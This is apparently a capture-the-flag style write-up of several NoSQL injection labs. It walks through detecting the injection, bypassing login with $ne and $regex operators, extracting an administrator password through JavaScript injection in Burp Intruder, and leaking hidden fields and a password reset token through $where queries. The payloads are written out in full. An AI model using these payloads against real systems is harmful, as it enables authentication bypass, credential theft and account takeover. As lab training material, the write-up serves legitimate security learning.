<img src="images/image1.png" alt="third" width="500">

**Step1:**

Click on any categories

<img src="images/image2.png" alt="third" width="500">

**Step2:**

Send the GET filter request to repeater

<img src="images/image3.png" alt="third" width="500">

**Step3:**

Check the injection point using '

<img src="images/image4.png" alt="third" width="500">

Now we use `\'`

<img src="images/image5.png" alt="third" width="500">

So it is clear that NoSQL vulnerability exist

**Step4:**

Now we inject this payload to view all product '||1||'

<img src="images/image6.png" alt="third" width="500">

And lab is solved

<img src="images/image7.png" alt="third" width="500">

**Step1:**

Login in to your account using wiener:peter

<img src="images/image8.png" alt="third" width="500">

Send the request to POST /login to repeater

**Step2:**

If we use  this payload it show id wiener in response. it is clear that password is not checking
```
{ "username": "wiener",

"password":{

"$ne":""

  }

}
```
<img src="images/image9.png" alt="third" width="500">

**Step3:**

If we replace the above word with admin or administrator it is not showing any redirection

<img src="images/image10.png" alt="third" width="500">

**Step4:**

To find username we using regex with the search that any username having adm in his name
```
{ "username": { "$regex": ".*adm.*" }, "password":{

"$ne":""

  }

}
```

<img src="images/image11.png" alt="third" width="500">

**Step5:**

Now replace name with the response name and modify request to

```
{ "username": "adminhcijsjg3", "password":{

"$ne":""

  }

}
```
<img src="images/image12.png" alt="third" width="500">

And open the request in browser it will solve.

Or paste session in inspect -> cookie value and refresh page and click on my-account button.

<img src="images/image13.png" alt="third" width="500">

**Step1:**

First login with given credential

<img src="images/image14.png" alt="third" width="500">

**Step2:**

Send the GET /user/lookup request to  repeater

**Step3:**

When I use ' ' it show error

<img src="images/image15.png" alt="third" width="500">

If we use url encoded `'%2b'`

<img src="images/image16.png" alt="third" width="500">

**Step4:**

Now we find password for administrator user

`administrator' && this.password.length < 30 || '1'=='2`

<img src="images/image17.png" alt="third" width="500">

The result show password is less then 30

After some try I found password is 7 character.

This can be found using number payload in intruder

**Step4:**

To extract password we use

`administrator' && this.password[§0§]=='§a§`

Send the above request to intruder

Attack type: cluster bomb

<img src="images/image18.png" alt="third" width="500">

Payload1 setting

<img src="images/image19.png" alt="third" width="500">

Payload2 setting

<img src="images/image20.png" alt="third" width="500">

**Step5**  
to find password first sord payload1 then sort length

<img src="images/image21.png" alt="third" width="500">

We have password

Knzddwlw

<img src="images/image_unmap1.png" alt="third" width="500">

**Step 1:**

Try to login with incorrect credential

<img src="images/image_unmap2.png" alt="third" width="500">

Send post /login request to repeater

<img src="images/image_unmap3.png" alt="third" width="500">


Now when we try to access carlos account with password  `{"$ne":"invalid"}` we have account lock message

<img src="images/image_unmap4.png" alt="third" width="500">

Add a parameter where and set it value to `0`

<img src="images/image_unmap5.png" alt="third" width="500">

We have incorrect username and password message

But when we change where to `1` we have account locked message

<img src="images/image_unmap6.png" alt="third" width="500">


**Step2:**

Now send the Request to intruder and change `where` parameter value to

<img src="images/image_unmap7.png" alt="third" width="500">

Select attack type cluster bomb

Payload1

<img src="images/image_unmap8.png" alt="third" width="500">

Payload 2 

<img src="images/image_unmap9.png" alt="third" width="500">

It is simple list of capital and small alphabet and number from 0-9

After the attack complete we have first parameter username

<img src="images/image_unmap10.png" alt="third" width="500">

Now change the 1 to 2 in where clause `"$where": "Object.keys(this)[2].match('^.{§§}§§.*')"`. Again same attack

<img src="images/image_unmap11.png" alt="third" width="500">
    
Now again but change 2 to 3

At 4 we have

<img src="images/image_unmap12.png" alt="third" width="500">

Here the parameter is `forgotPwd`


Send the forgot password request to repeater when we add a parameter foo with value bar we have normal response

<img src="images/image_unmap13.png" alt="third" width="500">


When we use forgotPwd with a value we have


<img src="images/image_unmap14.png" alt="third" width="500">

It means parameter is correct but value is not.

Due to internet issue I have again state the lab so I will continue from here

Now we find reset token for this we make one change in where

```
"$where":"this.mytokenvalue.match('^.{§§}§§.*')"
"$where":"this.newPwdTkn.match('^.{§§}§§.*')"

```

With same payloads and attack type

When we sort by length we have


<img src="images/image_unmap15.png" alt="third" width="500">

`newPwdTkn=b9557b7ca7f3600c`


**Step3:**

When we use GET /forgot password with this token we have password reset page

<img src="images/image_unmap16.png" alt="third" width="500">


Open request in browser

<img src="images/image_unmap17.png" alt="third" width="500">


Now login as carlos to solve the lab

